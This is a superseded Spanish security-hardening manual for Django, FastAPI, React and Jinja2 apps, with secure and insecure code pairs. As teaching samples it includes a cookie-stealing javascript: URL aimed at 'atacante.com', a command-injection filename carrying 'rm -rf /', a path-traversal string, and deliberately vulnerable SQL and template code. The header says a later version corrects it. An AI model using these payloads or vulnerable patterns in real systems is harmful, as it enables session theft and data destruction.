---
persona: oscar
ia: Hermes Agent (default, Claude Opus 5.5) — solo añadió este encabezado y el aviso
actualizado: 2026-10-30 20:32
zona_horaria: America/Bogota
estado: superado
reemplazado_por: _borradores/guia-seguridad-fastapi-django.md
---

> **Versión anterior.** La versión vigente es `_borradores\guia-seguridad-fastapi-django.md` (T-20261030-oscar-02), que corrige este manual (ver su §16). Se pasará a `Historial\` cuando el índice maestro actualice esta ruta.

# Manual de Arquitectura y Blindaje de Código contra Amenazas Cibernéticas
**Stack Tecnológico:** Python (Django, FastAPI) | React (TypeScript) | Plantillas Jinja2

---

## Introducción
Aunque ataques como DDoS, Ransomware o Troyanos suelen asociarse a la infraestructura de red o al sistema operativo, **el código de la aplicación es la última línea de defensa y, a menudo, el vector de entrada inicial**. Una vulnerabilidad en la validación de archivos subidos puede ejecutar un Ransomware en el servidor; una mala gestión del estado en el frontend puede facilitar ataques de Fuerza Bruta o *Spyware* mediante robo de sesiones (XSS).

A continuación, se desglosan las estrategias de mitigación **a nivel estrictamente de código y configuración de aplicación** para cada vector de ataque en el stack especificado.

---

## 1. Prevención de Inyección SQL (SQLi)

La Inyección SQL ocurre cuando datos no confiables del usuario se concatenan directamente en las consultas a la base de datos. 

### 1.1. Backend: Django
El ORM de Django parametriza las consultas por defecto, pero existen "trampas" en funciones avanzadas.

*   **Regla de Oro:** Usar siempre el ORM estándar (`filter()`, `exclude()`, `get()`, `annotate()`).
*   **Uso seguro de SQL Crudo (`raw()` y `cursor.execute()`):** Nunca uses `f-strings`, `.format()` ni `%` para inyectar variables. Pasa siempre los parámetros como una lista o tupla separada para que el driver de la base de datos (ej. `psycopg`) los escape.

```python
# ❌ VULNERABLE A SQLi
from django.db import connection
from myapp.models import Usuario

def buscar_usuario_inseguro(username: str):
    # ¡Peligro! Concatenación directa con f-string
    query = f"SELECT * FROM myapp_usuario WHERE username = '{username}'"
    return Usuario.objects.raw(query)

# ✅ SEGURO CONTRA SQLi
def buscar_usuario_seguro(username: str):
    # El driver de DB parametriza el argumento %s de forma segura
    query = "SELECT * FROM myapp_usuario WHERE username = %s"
    return Usuario.objects.raw(query, [username])

def ejecucion_directa_segura(email: str):
    with connection.cursor() as cursor:
        cursor.execute("UPDATE myapp_usuario SET activo = TRUE WHERE email = %s", [email])
```

*   **Prohibir `.extra()`:** El método `.extra()` del ORM está obsoleto en la práctica por riesgos de seguridad. Sustitúyelo por expresiones `Func`, `F`, `Q` y `RawSQL` parametrizado.

### 1.2. Backend: FastAPI (con SQLAlchemy 2.0)
En FastAPI, la defensa recae en la validación estricta de tipos de entrada mediante **Pydantic** combinada con **SQLAlchemy**.

```python
from fastapi import FastAPI, Depends, HTTPException
from pydantic import BaseModel, Field, constr
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, text
from models import Usuario

app = FastAPI()

# 1. Validación estricta en la capa de entrada (Pydantic)
class FiltroBusqueda(BaseModel):
    # Solo permite caracteres alfanuméricos, guiones y guiones bajos
    username: str = Field(..., min_length=3, max_length=30, pattern=r"^[a-zA-Z0-9_-]+$")

# 2. Uso del ORM y sentencias preparadas
@app.post("/buscar")
async def buscar_usuario(filtro: FiltroBusqueda, db: AsyncSession = Depends(get_db)):
    # ✅ Vía 1: ORM puro (100% parametrizado)
    stmt = select(Usuario).where(Usuario.username == filtro.username)
    result = await db.execute(stmt)
    
    # ✅ Vía 2: Texto crudo usando text() y bindparams (si es estrictamente necesario)
    stmt_raw = text("SELECT * FROM usuarios WHERE username = :uname").bindparams(uname=filtro.username)
    result_raw = await db.execute(stmt_raw)
    
    return result.scalars().all()
```

### 1.3. Frontend: React (TypeScript) y Jinja2
Aunque la seguridad real contra SQLi debe estar en el backend, el frontend reduce la superficie de ataque:
*   **React (TS):** Utilizar esquemas de validación como **Zod** antes de enviar formularios para asegurar que los IDs sean numéricos o UUIDs válidos, y nunca enviar fragmentos de consultas SQL (como filtros `WHERE` dinámicos construidos en el cliente) a través de la API.

---

## 2. Prevención de Ataques de Denegación de Servicio (DDoS / DoS en Capa 7)

A nivel de código (Capa de Aplicación / Capa 7), un ataque DoS busca agotar la CPU, la memoria RAM o el pool de conexiones de base de datos con muy pocas peticiones maliciosas (ej. *ReDoS*, *Billion Laughs XML*, cargas de archivos gigantes o consultas sin paginar).

### 2.1. Backend: Django
1.  **Límite de Tamaño de Peticiones y Archivos (`settings.py`):** Evita que un atacante llene la memoria RAM enviando JSONs o formularios gigantescos.
    ```python
    # settings.py
    DATA_UPLOAD_MAX_MEMORY_SIZE = 2621440  # 2.5 MB máximo para el body de la petición
    FILE_UPLOAD_MAX_MEMORY_SIZE = 2621440  # Pasar a disco temporal si supera 2.5 MB
    DATA_UPLOAD_MAX_NUMBER_FIELDS = 100    # Evita ataques de colisión de Hash en formularios
    ```
2.  **Throttling y Paginación Estricta (Django REST Framework):** Nunca devuelvas `.all()` sin paginar.
    ```python
    # settings.py
    REST_FRAMEWORK = {
        'DEFAULT_THROTTLE_CLASSES': [
            'rest_framework.throttling.AnonRateThrottle',
            'rest_framework.throttling.UserRateThrottle'
        ],
        'DEFAULT_THROTTLE_RATES': {
            'anon': '30/minute',
            'user': '300/minute'
        },
        'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.LimitOffsetPagination',
        'PAGE_SIZE': 50
    }
    ```

### 2.2. Backend: FastAPI
1.  **Rate Limiting con `slowapi` (Respaldado por Redis):**
    ```python
    from fastapi import FastAPI, Request
    from slowapi import Limiter, _rate_limit_exceeded_handler
    from slowapi.util import get_remote_address
    from slowapi.errors import RateLimitExceeded

    limiter = Limiter(key_func=get_remote_address, storage_uri="redis://localhost:6379/0")
    app = FastAPI()
    app.state.limiter = limiter
    app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

    @app.get("/reporte-pesado")
    @limiter.limit("5/minute")
    async def generar_reporte(request: Request):
        return {"status": "procesando"}
    ```
2.  **Middleware para limitar el tamaño del Body (Prevenir agotamiento de RAM):**
    ```python
    from starlette.middleware.base import BaseHTTPMiddleware
    from starlette.responses import JSONResponse

    class LimitUploadSizeMiddleware(BaseHTTPMiddleware):
        def __init__(self, app, max_upload_size: int):
            super().__init__(app)
            self.max_upload_size = max_upload_size

        async def dispatch(self, request: Request, call_next):
            if request.method in ("POST", "PUT", "PATCH"):
                content_length = request.headers.get("content-length")
                if content_length and int(content_length) > self.max_upload_size:
                    return JSONResponse(status_code=413, content={"detail": "Payload demasiado grande"})
            return await call_next(request)

    app.add_middleware(LimitUploadSizeMiddleware, max_upload_size=2_000_000) # 2MB
    ```
3.  **No bloquear el Event Loop:** En rutas `async def`, nunca ejecutes operaciones intensivas de CPU (procesamiento de imágenes, criptografía pesada) o I/O síncrono. Usa `def` normal (FastAPI lo envía a un *threadpool* externo) o delega a **Celery / ARQ**.
4.  **Prevención de ReDoS (Regular Expression DoS):** Evita expresiones regulares con repeticiones anidadas como `(a+)+$` al validar entradas, ya que bloquean el hilo de Python al evaluar cadenas maliciosas.

### 2.3. Frontend: React (TypeScript)
Evitar que el propio frontend haga un "auto-DDoS" al backend por errores de programación o abuso del usuario:
*   **Debouncing y Throttling:** Obligatorio en barras de búsqueda en tiempo real y eventos de scroll.
*   **AbortController:** Cancelar peticiones en vuelo si el componente se desmonta o el usuario escribe una nueva letra.

```tsx
import React, { useState, useEffect } from 'react';

export const BuscadorSeguro: React.FC = () => {
  const [query, setQuery] = useState<string>('');

  useEffect(() => {
    if (query.trim().length < 3) return;

    const controller = new AbortController();
    // Debounce de 400ms para no saturar el backend por cada tecla
    const timeoutId = setTimeout(async () => {
      try {
        await fetch(`/api/buscar?q=${encodeURIComponent(query)}`, {
          signal: controller.signal,
        });
      } catch (err: any) {
        if (err.name !== 'AbortError') console.error(err);
      }
    }, 400);

    return () => {
      clearTimeout(timeoutId);
      controller.abort(); // Cancela la petición HTTP si el usuario sigue escribiendo
    };
  }, [query]);

  return <input type="text" value={query} onChange={(e) => setQuery(e.target.value)} />;
};
```

---

## 3. Prevención de Ataques de Fuerza Bruta

El objetivo es impedir la adivinación automatizada de contraseñas, tokens OTP, PINs o rutas ocultas.

### 3.1. Backend: Algoritmos de Hashing y Bloqueo de Cuentas
El uso de algoritmos de hash lentos por diseño y consumidores de memoria (como **Argon2id**) hace que, incluso si la base de datos es robada, la fuerza bruta offline sea inviable.

#### En Django:
1.  **Configurar Argon2 como algoritmo principal (`settings.py`):**
    ```python
    # Requiere: pip install django[argon2]
    PASSWORD_HASHERS = [
        'django.contrib.auth.hashers.Argon2PasswordHasher',
        'django.contrib.auth.hashers.PBKDF2PasswordHasher',
    ]
    ```
2.  **Bloqueo automático con `django-axes`:** Bloquea por combinación de IP, User-Agent y Nombre de Usuario tras $N$ intentos fallidos.
    ```python
    # settings.py
    INSTALLED_APPS = [... , 'axes']
    MIDDLEWARE = [..., 'axes.middleware.AxesMiddleware']
    AUTHENTICATION_BACKENDS = [
        'axes.backends.AxesStandaloneBackend',
        'django.contrib.auth.backends.ModelBackend',
    ]
    AXES_FAILURE_LIMIT = 5               # 5 intentos fallidos
    AXES_COOLOFF_TIME = 1                # Bloqueo por 1 hora
    AXES_LOCKOUT_PARAMETERS = [["username", "ip_address"]]
    ```

#### En FastAPI:
Implementación de verificación en tiempo constante (contra ataques de *Timing*) y bloqueo exponencial en Redis:

```python
import secrets
from passlib.context import CryptContext
from fastapi import HTTPException, status
import redis.asyncio as redis

pwd_context = CryptContext(schemes=["argon2"], deprecated="auto")
redis_client = redis.from_url("redis://localhost:6379/0")

async def verificar_login(username: str, password_plana: str, ip: str, hash_db: str | None):
    key = f"login_fails:{ip}:{username}"
    intentos = await redis_client.get(key)
    
    if intentos and int(intentos) >= 5:
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail="Cuenta bloqueada temporalmente por múltiples intentos fallidos."
        )

    # Si el usuario no existe, ejecutamos un hash falso para evitar enumeración de usuarios por tiempo de respuesta (Timing Attack)
    hash_objetivo = hash_db or "$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$RdescudvJCsgt3ub+b+dWRWJTmaaJObG"
    es_valido = pwd_context.verify(password_plana, hash_objetivo)

    if not hash_db or not es_valido:
        pipe = redis_client.pipeline()
        pipe.incr(key)
        pipe.expire(key, 900) # Bloqueo de 15 minutos (900 seg)
        await pipe.execute()
        # Mensaje genérico: NUNCA revelar si falló el usuario o la contraseña
        raise HTTPException(status_code=401, detail="Credenciales inválidas")

    await redis_client.delete(key)
    return True
```

### 3.2. Frontend: React (TypeScript) y Jinja2
*   **Integración de Captcha Invisible (Cloudflare Turnstile o reCAPTCHA v3):** Solicitar un token criptográfico antes de habilitar el botón de envío y validarlo en el backend antes de tocar la base de datos.
*   **Deshabilitación de UI:** Deshabilitar el botón de *Submit* mientras la petición está en curso (`isSubmitting`).

---

## 4. Prevención de Virus, Troyanos y Ransomware

A nivel de código web, un virus, troyano o ransomware entra principalmente por tres vías:
1.  **Subida de archivos maliciosos (Unrestricted File Upload):** Un atacante sube un script `.php`, `.py`, un ejecutable o un PDF/SVG infectado que luego se ejecuta en el servidor (Ransomware) o infecta a otros usuarios que lo descargan (Troyano).
2.  **Ejecución Remota de Código (RCE):** Mediante deserialización insegura (`pickle`, `yaml.load`) o inyección de comandos del sistema (`os.system`).
3.  **Inyección en la Cadena de Suministro (Supply Chain):** Paquetes de `pip` o `npm` infectados.

### 4.1. Blindaje de Subida de Archivos (Django y FastAPI)
**Nunca confíes en la extensión del archivo ni en la cabecera `Content-Type` enviada por el navegador.** Debes inspeccionar los *Magic Bytes* (cabeceras binarias reales), renombrar el archivo a un UUID y escanearlo en memoria con **ClamAV** antes de guardarlo.

```python
# Ejemplo completo en FastAPI (La misma lógica aplica en un validador de Django Form/Serializer)
import uuid
import magic # pip install python-magic
import clamd # pip install clamd (Demonio antivirus ClamAV en red/socket)
from io import BytesIO
from fastapi import UploadFile, HTTPException

ALLOWED_MIME_TYPES = {"image/jpeg": ".jpg", "image/png": ".png", "application/pdf": ".pdf"}

async def procesar_archivo_seguro(archivo: UploadFile) -> str:
    contenido = await archivo.read()
    
    # 1. Validar Magic Bytes reales (no la extensión del nombre)
    mime_real = magic.from_buffer(contenido[:2048], mime=True)
    if mime_real not in ALLOWED_MIME_TYPES:
        raise HTTPException(status_code=400, detail=f"Tipo de archivo real ({mime_real}) no permitido.")

    # 2. Escaneo de Virus/Troyanos/Ransomware en memoria con ClamAV
    try:
        cd = clamd.ClamdNetworkSocket(host='clamav-server', port=3310)
        resultado_scan = cd.instream(BytesIO(contenido))
        if resultado_scan and resultado_scan['stream'][0] == 'FOUND':
            virus_name = resultado_scan['stream'][1]
            # Registrar alerta crítica de seguridad aquí
            raise HTTPException(status_code=422, detail=f"Amenaza detectada: {virus_name}")
    except clamd.ConnectionError:
        raise HTTPException(status_code=503, detail="Servicio de análisis de seguridad no disponible.")

    # 3. Neutralizar el nombre del archivo (Previene Path Traversal como ../../etc/passwd)
    extension_segura = ALLOWED_MIME_TYPES[mime_real]
    nombre_seguro = f"{uuid.uuid4().hex}{extension_segura}"

    # 4. Guardar fuera del árbol de ejecución del código (Idealmente en S3/MinIO sin permisos de ejecución)
    # Si se guarda en disco local, el directorio debe estar montado con el flag `noexec` en Linux.
    return nombre_seguro
```
*Nota sobre imágenes:* Si permites subir imágenes, **prohíbe el formato `.svg`** para avatares de usuario (un SVG es un documento XML que puede contener código JavaScript malicioso embebido). Para `.jpg` y `.png`, ábrelos con `Pillow`, elimina los metadatos EXIF y vuelve a codificar la imagen desde cero para destruir cualquier payload oculto por esteganografía.

### 4.2. Prevención de RCE y Ransomware en Python
*   **Prohibido `pickle` y `yaml.load()`:** Deserializar datos de usuarios con `pickle.loads()` permite a un atacante ejecutar un comando que encripte todo el servidor (Ransomware). Usa exclusivamente `json` o `yaml.safe_load()`.
*   **Prohibido `shell=True`:** Si debes llamar a un subproceso del sistema operativo, hazlo pasando una lista de argumentos y nunca activando la shell:
    ```python
    import subprocess
    # ❌ VULNERABLE (Si archivo = "foto.jpg; rm -rf /")
    # subprocess.run(f"convert {archivo} salida.png", shell=True)

    # ✅ SEGURO (Los argumentos no son interpretados como comandos de consola)
    subprocess.run(["convert", archivo_validado, "salida.png"], shell=False, check=True)
    ```

### 4.3. Protección contra Ransomware a Nivel de Almacenamiento (Código de Integración S3)
Para que un Ransomware no pueda destruir las copias de seguridad o archivos de los clientes en la nube desde credenciales comprometidas del backend, configura las subidas con `boto3` utilizando **S3 Object Lock (Modo WORM: Write-Once-Read-Many)** y exige el menor privilegio en los roles IAM (la aplicación web puede hacer `PutObject` y `GetObject`, pero **no tiene permiso `DeleteObject`**).

---

## 5. Prevención de Spyware y Adware (XSS, Robo de Sesiones y Supply Chain)

En el contexto del desarrollo web, el **Spyware** se materializa mediante ataques **Cross-Site Scripting (XSS)** (scripts inyectados que leen el teclado del usuario, roban sus tokens de sesión o leen sus datos privados en pantalla) y el **Adware** mediante la inyección de iframes, redirecciones abiertas (*Open Redirects*) o scripts de terceros comprometidos (*Magecart*).

### 5.1. Frontend: React con TypeScript
React escapa por defecto las variables renderizadas dentro de llaves `{variable}`, pero presenta vectores críticos que un desarrollador debe blindar en TypeScript:

1.  **Sanitización obligatoria con `DOMPurify` si se requiere renderizar HTML:**
    ```tsx
    import React from 'react';
    import DOMPurify from 'dompurify';

    interface ComentarioProps {
      htmlCrudo: string;
    }

    export const ComentarioSeguro: React.FC<ComentarioProps> = ({ htmlCrudo }) => {
      // Elimina cualquier etiqueta <script>, eventos onload/onerror y enlaces javascript:
      const htmlLimpio = DOMPurify.sanitize(htmlCrudo, {
        USE_PROFILES: { html: true },
        FORBID_TAGS: ['style', 'iframe', 'object', 'embed', 'form'],
        FORBID_ATTR: ['style', 'onerror', 'onload', 'onclick']
      });

      return <div dangerouslySetInnerHTML={{ __html: htmlLimpio }} />;
    };
    ```
2.  **Validación de URLs dinámicas (Prevenir `javascript:` XSS y Adware Redirects):**
    React **no** bloquea inyecciones en atributos `href` o `src` si el usuario introduce `javascript:fetch('http://atacante.com/?cookie='+document.cookie)`.
    ```tsx
    // Helper estricto en TypeScript para validar enlaces antes de renderizarlos
    export function sanitizarUrl(url: string): string {
      try {
        const parsed = new URL(url, window.location.origin);
        if (['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
          return parsed.href;
        }
      } catch (e) {
        return '#';
      }
      return '#'; // Bloquea javascript:, data:, vbscript:
    }

    // Uso en componente: <a href={sanitizarUrl(perfilUsuario.website)} rel="noopener noreferrer">Web</a>
    ```
3.  **Prohibición de `localStorage` para Tokens de Sesión:**
    Cualquier script de terceros (analíticas, fuentes, librerías de npm comprometidas) tiene acceso total a `window.localStorage` y `sessionStorage`. **Los tokens JWT o de sesión deben almacenarse exclusivamente en cookies con las banderas `HttpOnly`, `Secure` y `SameSite=Strict`**, haciendo que sean invisibles para cualquier Spyware basado en JavaScript.

### 5.2. Frontend: Plantillas Jinja2 (con FastAPI o Django)
1.  **Forzar `autoescape=True` al inicializar el entorno en Python:**
    En FastAPI, asegúrate de que el motor de Jinja2 tenga el autoescape activado para todo tipo de archivos.
    ```python
    from jinja2 import Environment, FileSystemLoader, select_autoescape

    env = Environment(
        loader=FileSystemLoader("templates"),
        autoescape=select_autoescape(["html", "htm", "xml", "j2"]) # Crítico
    )
    ```
2.  **Uso correcto del filtro `| tojson` dentro de bloques `<script>`:**
    Un error muy común en Jinja2 es inyectar una variable de Python directamente entre comillas dentro de un `<script>`.
    ```html
    <!-- ❌ VULNERABLE A SPYWARE/XSS en Jinja2 -->
    <script>
        // Si nombre_usuario es: "; alert(1); // -> Se ejecuta código arbitrario
        const username = "{{ nombre_usuario }}";
    </script>

    <!-- ✅ SEGURO en Jinja2 -->
    <script>
        // El filtro tojson escapa caracteres HTML (<, >, &) y comillas de forma segura
        const username = {{ nombre_usuario | tojson }};
    </script>
    ```
3.  **Prohibir el filtro `| safe`:** Nunca apliques `{{ contenido_usuario | safe }}` a menos que ese texto haya pasado previamente por una librería de limpieza estricta en Python como **`nh3`** (el reemplazo moderno en Rust para el obsoleto `bleach`).

### 5.3. Backend: Content Security Policy (CSP) y Subresource Integrity (SRI)
La defensa definitiva contra el Spyware y Adware en el navegador es dictar desde el backend qué scripts pueden ejecutarse y a qué servidores puede enviar datos el navegador (bloqueando la exfiltración de datos).

*   **Cabecera CSP con `nonce` dinámico (Django con `django-csp` o Middleware en FastAPI):**
    ```python
    # Middleware en FastAPI para inyectar cabeceras anti-spyware/adware
    import secrets
    from fastapi import Request

    @app.middleware("http")
    async def security_headers_middleware(request: Request, call_next):
        nonce = secrets.token_urlsafe(16)
        request.state.csp_nonce = nonce
        response = await call_next(request)
        
        csp_policy = (
            f"default-src 'self'; "
            f"script-src 'self' 'nonce-{nonce}' 'strict-dynamic'; "
            f"style-src 'self' 'nonce-{nonce}'; "
            f"img-src 'self' data: https:; "
            f"connect-src 'self' https://api.midominio.com; " # Impide que un spyware envíe datos a dominios de atacantes
            f"frame-ancestors 'none'; " # Impide Clickjacking / Adware en iframes
            f"base-uri 'self'; "
            f"form-action 'self';"
        )
        response.headers["Content-Security-Policy"] = csp_policy
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=(), payment=()" # Bloquea espionaje de hardware
        return response
    ```
*   **Subresource Integrity (SRI) en Jinja2 / index.html:** Si cargas algún script de un CDN externo, incluye siempre su hash criptográfico para que el navegador lo bloquee si el CDN es hackeado con Adware/Spyware:
    ```html
    <script src="https://cdn.ejemplo.com/lib.js" 
            integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" 
            crossorigin="anonymous"></script>
    ```

---

## 6. Prevención de Ataques Man-in-the-Middle (MitM)

Un ataque MitM ocurre cuando un atacante intercepta o modifica el tráfico entre el cliente (React/Jinja2) y el servidor (Django/FastAPI), o entre el backend y servicios externos (bases de datos, APIs de pago).

### 6.1. Backend: Configuración Estricta en Django (`settings.py`)
```python
# settings.py (Entorno de Producción)

# 1. Forzar HTTPS y activar HSTS (HTTP Strict Transport Security)
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 63072000          # 2 años: el navegador jamás volverá a intentar conectar por HTTP plano
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# 2. Si estás detrás de un Reverse Proxy (Nginx, Cloudflare, AWS ALB), validar la cabecera de forma segura
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')

# 3. Blindar Cookies contra interceptación en red y ataques CSRF
SESSION_COOKIE_SECURE = True            # Solo se transmite por túnel TLS/HTTPS
SESSION_COOKIE_HTTPONLY = True          # Inaccesible desde JavaScript
SESSION_COOKIE_SAMESITE = 'Strict'      # Mitiga CSRF
SESSION_COOKIE_NAME = '__Host-sessionid'# El prefijo __Host- obliga al navegador a exigir HTTPS y path=/

CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SAMESITE = 'Strict'
CSRF_COOKIE_NAME = '__Host-csrftoken'
```

### 6.2. Backend: Configuración en FastAPI y Clientes HTTP Salientes (`httpx` / `requests`)
1.  **Forzar HTTPS y Hosts permitidos en FastAPI:**
    ```python
    from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
    from fastapi.middleware.trustedhost import TrustedHostMiddleware

    # Evita ataques de Host Header Injection (envenenamiento de caché y reseteo de contraseñas)
    app.add_middleware(TrustedHostMiddleware, allowed_hosts=["midominio.com", "*.midominio.com"])
    # Redirige todo tráfico HTTP a HTTPS (Complementar con cabecera Strict-Transport-Security en el middleware)
    app.add_middleware(HTTPSRedirectMiddleware)
    ```
2.  **Comunicaciones salientes desde el Backend (Prevenir MitM entre microservicios):**
    Nunca uses `verify=False` en `requests` o `httpx`. Forzar como mínimo **TLS 1.3** y validación estricta de certificados al conectar con APIs externas o con PostgreSQL (`sslmode=verify-full`).
    ```python
    import ssl
    import httpx

    # Contexto TLS estricto que prohíbe TLS 1.0, 1.1 y 1.2 si el servidor soporta 1.3
    ssl_context = ssl.create_default_context()
    ssl_context.minimum_version = ssl.TLSVersion.TLSv1_3

    async def llamada_api_externa_segura(datos: dict):
        async with httpx.AsyncClient(verify=ssl_context, timeout=5.0) as client:
            respuesta = await client.post("https://api.pagos.com/v1/cobrar", json=datos)
            respuesta.raise_for_status()
            return respuesta.json()
    ```

### 6.3. Frontend: React (TypeScript)
1.  **Variables de entorno seguras:** Validar en tiempo de compilación (Vite / Next.js / Webpack) que todas las URLs de la API comiencen estrictamente con `https://` y `wss://` (para WebSockets).
2.  **Bloqueo de Contenido Mixto (Mixed Content):** En el `index.html` de React o la plantilla base de Jinja2, incluir o enviar por cabecera HTTP la directiva `upgrade-insecure-requests` dentro del CSP para obligar al navegador a transformar automáticamente cualquier recurso `http://` olvidado a `https://`.
3.  **CORS Estricto y Credenciales:** Configurar `axios` o `fetch` con `credentials: 'same-origin'` (o `'include'` solo hacia el subdominio exacto de la API) y configurar `CORSMiddleware` en FastAPI o `django-cors-headers` en Django con una lista blanca explícita de orígenes (`allow_origins=["https://app.midominio.com"]`). **Jamás combinar `allow_origins=["*"]` con `allow_credentials=True`**.

---

## 7. Checklist de Automatización CI/CD (Defensa en Profundidad)

Para garantizar que ningún desarrollador introduzca accidentalmente vulnerabilidades en el código a lo largo del tiempo, integra estas herramientas en tu pipeline de Git (GitHub Actions / GitLab CI):

| Capa | Herramienta | Propósito Específico | Comando de Ejecución |
| :--- | :--- | :--- | :--- |
| **Python (Código)** | **Bandit** | Detecta problemas de seguridad estáticos (uso de `pickle`, `shell=True`, SQL crudo con `f-strings`, claves quemadas). | `bandit -r ./backend` |
| **Python (Librerías)** | **pip-audit** | Escanea `requirements.txt` o `poetry.lock` contra bases de datos de CVEs para evitar Troyanos/Supply Chain. | `pip-audit` |
| **Django (Config)** | **Check Deploy** | Audita el archivo `settings.py` buscando fallos de MitM, CSRF, HSTS y cookies inseguras. | `python manage.py check --deploy` |
| **React TS (Librerías)**| **npm audit** | Detecta paquetes infectados con Adware/Spyware o vulnerabilidades de ReDoS en `node_modules`. | `npm audit --audit-level=high` |
| **Fullstack (SAST)** | **Semgrep** | Motor de análisis estático con reglas específicas para FastAPI, Django, Jinja2 y React TypeScript. | `semgrep scan --config=auto` |